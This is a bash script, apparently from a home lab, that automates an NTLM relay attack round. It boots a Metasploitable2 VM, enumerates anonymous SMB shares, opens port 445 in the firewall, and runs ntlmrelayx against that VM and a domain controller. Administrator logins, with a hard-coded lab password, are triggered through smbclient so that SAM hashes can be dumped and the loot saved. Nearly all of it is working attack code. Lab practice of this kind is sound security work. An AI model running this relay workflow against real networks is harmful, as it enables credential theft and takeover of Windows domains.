#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — ROUND 5 (relay win) — TARS.LOCAL 2026-08-09
# 1. metasploitable2 boot + IP (sin depender del MAC: hostname en leases)
# 2. firewall-cmd 445 (firewalld activo, zona FedoraWorkstation)
# 3. RELAY WIN: ntlmrelayx Administrator -> metasploitable2 (SAM dump attempt)
# 4. relay -> DC SMB (signing block)
# 5. cleanup
# =============================================================================
set -u
DC=192.168.122.50
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1
TS(){ date +%H:%M:%S; }
echo "[$(TS)] ============ ROUND 5 START ============"

# 1. boot + IP
echo "[$(TS)] === R5.1 metasploitable2 boot + IP ==="
virsh start metasploitable2 2>&1 | head -2
META_IP=""
for i in $(seq 1 18); do
  sleep 10
  META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk 'toupper($4)=="IPV4"{print $5}' | grep -vE "^(192\.168\.122\.50|192\.168\.122\.151)$" | head -1)
  # tambien intentar por hostname en la ultima columna
  [ -z "$META_IP" ] && META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk '{print $5, $NF}' | grep -iE "meta|msf" | awk '{print $1}' | head -1)
  [ -n "$META_IP" ] && break
done
echo "[$(TS)] metasploitable2 IP=${META_IP:-NONE}"
echo "[$(TS)] leases actuales:"; virsh net-dhcp-leases default 2>/dev/null | head -8
if [ -n "$META_IP" ]; then
  echo "$META_IP" > "$OUT/08a-meta-ip.txt"
  timeout 20 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"

  # 2. firewall
  echo "[$(TS)] === R5.2 firewall 445 ==="
  firewall-cmd --state 2>&1 | tee "$OUT/08b-firewall.txt"
  firewall-cmd --add-port=445/tcp 2>&1 | tee -a "$OUT/08b-firewall.txt"
  firewall-cmd --list-ports 2>&1 | tee -a "$OUT/08b-firewall.txt"
  sleep 2
  nc -zvw3 $HOST_IP 445 2>&1 | tee -a "$OUT/08b-firewall.txt"

  # 3. RELAY WIN
  echo "[$(TS)] === R5.3 RELAY WIN: Administrator -> metasploitable2 ==="
  $VENV/ntlmrelayx.py -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
  RELAYPID=$!
  sleep 7
  timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08c-trigger-smbclient.txt"
  sleep 15
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -iE "authenticated|dumping|sam|share|nt_status|session|attempting|error|wrote|smb-|target|hash" "$OUT/08-relayx-meta.log" | head -40 | tee "$OUT/08d-relay-meta-result.txt"
  echo "[$(TS)] loot:"; ls -la "$OUT/relay-loot-meta/" 2>/dev/null | head -8 | tee -a "$OUT/08d-relay-meta-result.txt"

  # 4. relay -> DC SMB (signing)
  echo "[$(TS)] === R5.4 relay Administrator -> DC SMB (signing) ==="
  $VENV/ntlmrelayx.py -t "smb://$DC" -smb2support -l "$OUT/relay-loot-dcsmb" >"$OUT/08-relayx-dcsmb.log" 2>&1 &
  RELAYPID=$!
  sleep 7
  timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08h-trigger-dcsmb.txt"
  sleep 15
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -iE "authenticated|dumping|sam|nt_status|session|attempting|error|signing|refus|accept|target|smb-|hash" "$OUT/08-relayx-dcsmb.log" | head -25 | tee "$OUT/08i-relay-dcsmb-result.txt"
else
  echo "[$(TS)] IP NO ENCONTRADA — documentar, sin relay win" | tee "$OUT/08a-meta-ip.txt"
fi

# 5. cleanup
echo "[$(TS)] === R5.5 cleanup ==="
firewall-cmd --remove-port=445/tcp 2>&1 | head -1
virsh shutdown metasploitable2 2>&1 | head -1
echo "[$(TS)] ============ ROUND 5 DONE ============"
